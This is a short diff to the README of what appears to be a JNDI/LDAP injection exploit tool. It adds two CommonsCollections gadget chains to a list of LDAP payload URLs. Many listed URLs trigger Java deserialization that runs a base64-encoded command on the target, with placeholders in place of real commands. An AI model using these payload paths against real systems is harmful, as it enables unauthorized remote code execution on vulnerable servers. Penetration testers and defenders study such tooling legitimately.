@@ -69,6 +69,8 @@ Supported LADP Queries：
     ldap://0.0.0.0:1389/Deserialization/URLDNS/[domain]
     ldap://0.0.0.0:1389/Deserialization/CommonsCollectionsK1/Dnslog/[domain]
     ldap://0.0.0.0:1389/Deserialization/CommonsCollectionsK2/Command/Base64/[base64_encoded_cmd]
+    ldap://0.0.0.0:1389/Deserialization/CommonsCollectionsK3/Command/Base64/[base64_encoded_cmd]
+    ldap://0.0.0.0:1389/Deserialization/CommonsCollectionsK4/Command/Base64/[base64_encoded_cmd]
     ldap://0.0.0.0:1389/Deserialization/CommonsCollections1/Command/Base64/[base64_encoded_cmd]
     ldap://0.0.0.0:1389/Deserialization/CommonsCollections1_1/Command/Base64/[base64_encoded_cmd]
     ldap://0.0.0.0:1389/Deserialization/CommonsCollections2/Command/Base64/[base64_encoded_cmd]
